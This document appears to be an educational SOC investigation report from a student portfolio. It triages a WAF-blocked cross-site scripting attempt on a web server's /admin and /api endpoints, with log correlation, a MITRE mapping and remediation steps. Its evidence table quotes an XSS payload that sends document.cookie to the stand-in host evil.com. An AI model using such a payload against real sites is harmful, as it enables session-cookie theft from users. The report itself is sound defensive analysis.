# SOC Analyst Investigation Report

## Ticket Overview

| Field            | Details                            |
| ---------------- | ---------------------------------- |
| Ticket ID        | CS-021                             |
| Alert Name       | IPS: Cross-Site Scripting          |
| Ticket Status    | Closed                             |
| Priority / SLA   | Normal / Medium                    |
| Created Date     | 4/25/25 3:52 PM                    |
| Closed By        | Ananda Das                         |
| Analyst Decision | **True Positive — Blocked by WAF** |

## Executive Summary

An IPS alert was triggered for **Cross-Site Scripting** involving inbound web traffic from external source IP **154.66.109.244** to internal destination **10.0.15.14 / LinQAWebServer05**.

Firewall and IPS logs showed the traffic as **allowed**, but correlated WAF logs confirmed the malicious XSS request was **blocked** with HTTP response code **403**. The observed payload attempted JavaScript execution through an HTML image tag and attempted to access `document.cookie`.

No successful XSS execution, session theft, user compromise, application compromise, or service impact was confirmed from the provided evidence.

## Alert Details

| Field             | Value                                               |
| ----------------- | --------------------------------------------------- |
| Receive Time      | 4/23/2025 16:51                                     |
| Source IP         | 154.66.109.244                                      |
| Destination IP    | 10.0.15.14                                          |
| Threat Name       | Cross-Site Scripting                                |
| Severity          | Medium                                              |
| Firewall Action   | Allowed                                             |
| IPS Action        | Allowed                                             |
| WAF Action        | Blocked                                             |
| WAF Response Code | 403                                                 |
| Direction         | Inbound                                             |
| User              | NA                                                  |
| IPS Device        | IPS_01                                              |
| Source Reputation | 100% abuse confidence                               |
| Source Details    | ISPClients2; AS37642; comnet.co.ls; Maseru, Lesotho |

## Affected Assets

| Asset Field          | Details                                                     |
| -------------------- | ----------------------------------------------------------- |
| Destination IP       | 10.0.15.14                                                  |
| Hostname             | LinQAWebServer05                                            |
| Operating System     | Linux - RHEL 8                                              |
| Platform             | Linux                                                       |
| Asset Role           | Web Server                                                  |
| Hosting              | AWS Cloud                                                   |
| Business Criticality | Not Provided                                                |
| Exposure Concern     | Web endpoints `/admin` and `/api` targeted with XSS payload |

## Evidence Reviewed

| Evidence Source             | Observation                                                                |
| --------------------------- | -------------------------------------------------------------------------- |
| IPS Alert                   | Cross-Site Scripting detected                                              |
| Firewall Logs               | Traffic shown as **Allowed**                                               |
| IPS Logs                    | XSS detection shown as **allowed**                                         |
| WAF Logs                    | Malicious XSS payload **blocked**                                          |
| WAF Response                | HTTP **403**                                                               |
| Affected URLs               | `/admin`, `/api`                                                           |
| Matched Payload             | `<img src='x' onerror='fetch("http://evil.com?cookie="+document.cookie)'>` |
| Successful Script Execution | Not Observed                                                               |
| Session/Cookie Theft        | Not Observed                                                               |
| Service Impact              | Not Provided                                                               |

## SIEM / Splunk Analysis

```spl
index=main "154.66.109.244" "10.0.15.14"
| table _time, sourcetype, srcIP, dstIP, http_method, URL, matched_string, response_code, Threat_Name, Severity, Action
| sort - _time
```

| Time             | Source        | URL    | Method | Threat               | Action  | Response |
| ---------------- | ------------- | ------ | ------ | -------------------- | ------- | -------- |
| 2025-04-23 16:53 | waf_logs      | /api   | PUT    | Cross-Site Scripting | Blocked | 403      |
| 2025-04-23 16:53 | IPS_logs      | NA     | NA     | Cross-Site Scripting | allowed | NA       |
| 2025-04-23 16:53 | firewall_logs | NA     | NA     | NA                   | Allowed | NA       |
| 2025-04-23 16:51 | waf_logs      | /admin | PUT    | Cross-Site Scripting | Blocked | 403      |
| 2025-04-23 16:51 | IPS_logs      | NA     | NA     | Cross-Site Scripting | allowed | NA       |
| 2025-04-23 16:51 | firewall_logs | NA     | NA     | NA                   | Allowed | NA       |

**Analysis Note:** Firewall and IPS allowed the network/application inspection flow, but WAF blocked the malicious XSS payload before successful processing by the web application.

## MITRE ATT&CK Mapping

| Tactic            | Technique                                     | ID        | Reason                                                               |
| ----------------- | --------------------------------------------- | --------- | -------------------------------------------------------------------- |
| Initial Access    | Exploit Public-Facing Application             | T1190     | XSS payload targeted public web application endpoints                |
| Execution         | Command and Scripting Interpreter: JavaScript | T1059.007 | Payload attempted JavaScript execution through an HTML event handler |
| Credential Access | Steal Web Session Cookie                      | T1539     | Payload attempted to access `document.cookie`; theft not confirmed   |

## Analyst Assessment

**Assessment:** **True Positive — Blocked XSS Attempt**

The alert is valid because WAF logs confirmed an XSS payload targeting `/admin` and `/api`. The payload attempted JavaScript execution and cookie access, which could support session theft if executed successfully.

This is **not a confirmed compromise**. The WAF blocked the request with HTTP **403**, and no successful execution, session theft, or user impact was observed.

## Impact Analysis

| Area            | Assessment                                                                 |
| --------------- | -------------------------------------------------------------------------- |
| Confidentiality | No session/cookie theft observed                                           |
| Integrity       | No application modification confirmed                                      |
| Availability    | No service disruption reported                                             |
| Business Impact | No confirmed impact; elevated concern due to `/admin` and `/api` targeting |
| Current Risk    | Reduced because WAF blocked the request                                    |

## Recommended Actions

1. Block source IP **154.66.109.244** at the firewall as per policy.
2. Update IPS action for the XSS signature to **block**, if supported.
3. Keep WAF XSS protection in **Blocking** mode.
4. Review web logs for additional requests from the same source IP.
5. Validate whether `PUT` is required on `/admin` and `/api`; disable if unnecessary.
6. Restrict `/admin` access to trusted users or approved networks where possible.
7. Escalate only if XSS payloads return HTTP **200**, script execution is confirmed, session theft is suspected, or WAF fails to block recurrence.

## Escalation Decision

**Decision:** **No SOC L2 escalation required; close after firewall/IPS/WAF rule update.**

**Reason:** The WAF blocked the malicious request with HTTP **403**, and no successful XSS execution, cookie theft, user compromise, application compromise, or service impact was confirmed from the reviewed logs.

## Final Ticket Closure Comment

SOC investigated ticket **CS-021 — IPS: Cross-Site Scripting**. Inbound web traffic from **154.66.109.244** to **10.0.15.14 / LinQAWebServer05** triggered an XSS alert. Firewall and IPS logs showed the traffic as allowed, but WAF logs confirmed the malicious payload was blocked with HTTP **403**. The payload attempted JavaScript execution and access to `document.cookie` against `/admin` and `/api`. No successful XSS execution, session theft, user compromise, application compromise, or service impact was observed. Ticket closed as **True Positive — Blocked by WAF**, with firewall/IPS/WAF rule updates recommended.

## Skills Demonstrated

WAF/IPS/firewall log correlation, XSS investigation, web attack triage, payload analysis, source reputation review, MITRE ATT&CK mapping, impact assessment, escalation decision-making, and SOC ticket documentation.

---

## ⚠️ Disclaimer

This repository is created for educational, portfolio, and career development purposes only.

All scenarios are sanitized and written in a safe format. No confidential company information, client data, or real production logs are included.

---

## 👤 Author

**Ananda Das**
Cybersecurity Student | SOC Analyst Learner | SIEM, Threat Detection & Incident Response Enthusiast

GitHub: [@nothingnhm](https://github.com/nothingnhm)

---

## ⭐ Repository Purpose

This project is part of my cybersecurity portfolio to demonstrate practical experience in ticket triage, IT troubleshooting, SOC alert analysis, and professional documentation.
